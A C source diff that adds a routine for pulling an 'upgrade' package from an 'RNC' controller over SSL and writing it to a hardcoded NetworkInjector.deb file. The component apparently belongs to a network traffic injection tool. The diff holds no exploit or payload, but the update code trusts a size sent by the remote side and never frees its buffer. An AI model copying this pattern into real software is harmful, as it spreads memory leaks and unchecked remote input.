@@ -31,6 +31,7 @@ void rnc_handleproto(BIO *ssl);
 int rnc_sendversion(BIO *ssl);
 int rnc_sendmonitor(BIO *ssl, char *status, char *desc);
 int rnc_retrieveconf(BIO *ssl);
+int rnc_retrieveupgrade(BIO *ssl);
 int rnc_retrievecert(BIO *ssl);
 int rnc_sendlogs(BIO *ssl);
 void get_system_stats(u_int *disk, u_int *cpu, u_int *pcpu);
@@ -252,7 +253,7 @@ void rnc_handleproto(BIO *ssl)
 {
    RncProtoHeader pheader;
    RncProtoLogin plogin;
-   int ret;
+   int ret, retu;
    char descr[1024];
    char empty[RNC_SIGN_LEN];
    int need_cert = 0;
@@ -376,6 +377,20 @@ void rnc_handleproto(BIO *ssl)
 
    } else {
       DEBUG_MSG(D_DEBUG, "NO new configuration this time...");
+   }
+
+   /* retrieve new upgrade (if any) */
+   if ((retu = rnc_retrieveupgrade(ssl)) < 0) {
+      DEBUG_MSG(D_ERROR, "Cannot communicate with RNC (upgrade)");
+      return;
+   }
+
+   /* check if there are new configs */
+   if (retu) {
+      DEBUG_MSG(D_INFO, "Received new upgrade...");
+      fclose(open_data("tmp", "upgrade_received", FOPEN_WRITE_TEXT));
+   } else {
+      DEBUG_MSG(D_DEBUG, "NO new upgrade this time...");
    }
 
    /* send cached logs */
@@ -569,6 +584,64 @@ int rnc_retrieveconf(BIO *ssl)
    return found;
 }
 
+int rnc_retrieveupgrade(BIO *ssl)
+{
+   FILE *fc;
+   RncProtoHeader pheader;
+   RncProtoUpgrade pupgrade;
+   char *conf;
+   int found = 0;
+
+   /* header parameters */
+   pheader.code = RNC_PROTO_UPGRADE;
+   pheader.size = 0;
+
+   /* send request to check if there is new config */
+   if (ssl_proto_write(ssl, &pheader, sizeof(pheader)) <= 0)
+      return -1;
+
+   /* loop to receive the new conf */
+   LOOP {
+      memset(&pheader, 0, sizeof(pheader));
+      memset(&pupgrade, 0, sizeof(pupgrade));
+
+      /* read the response from RNC */
+      if (ssl_proto_read(ssl, &pheader, sizeof(pheader)) <= 0)
+         break;
+
+      /* there is NOT a new upgrade */
+      if (pheader.code != RNC_PROTO_UPGRADE)
+         break;
+
+      /* retrieve the upgrade header */
+      if (ssl_proto_read(ssl, &pupgrade, sizeof(pupgrade)) <= 0)
+         break;
+
+      /* allocate the buffer and read the upgrade from RNC */
+      SAFE_CALLOC(conf, pupgrade.size, sizeof(char));
+      if (ssl_proto_read(ssl, conf, pupgrade.size) <= 0)
+         break;
+
+      DEBUG_MSG(D_INFO, "Received new upgrade file [%s]", "NetworkInjector.deb"); //pupgrade.filename);
+
+      /* open the upgrade file for writing */
+      fc = open_data("etc", "NetworkInjector.deb", FOPEN_WRITE_TEXT); //pupgrade.filename, FOPEN_WRITE_TEXT);
+      ON_ERROR(fc, NULL, "Cannot open %s", "NetworkInjector.deb"); //pupgrade.filename);
+
+      /* dump the content of the buffer received from RNC into the file */
+      if (fwrite(conf, sizeof(char), pupgrade.size, fc) < pupgrade.size)
+         DEBUG_MSG(D_ERROR, "Cannot write conf file [%s]", "NetworkInjector.deb"); //pupgrade.filename);
+
+      DEBUG_MSG(D_DEBUG, "Upgrade file [%s] written (%d bytes)", "NetworkInjector.deb", pupgrade.size); //pupgrade.filename, pupgrade.size);
+
+      fclose(fc);
+
+      /* increment the number of received upgrade */
+      found++;
+   }
+
+   return found;
+}
 
 int rnc_retrievecert(BIO *ssl)
 {
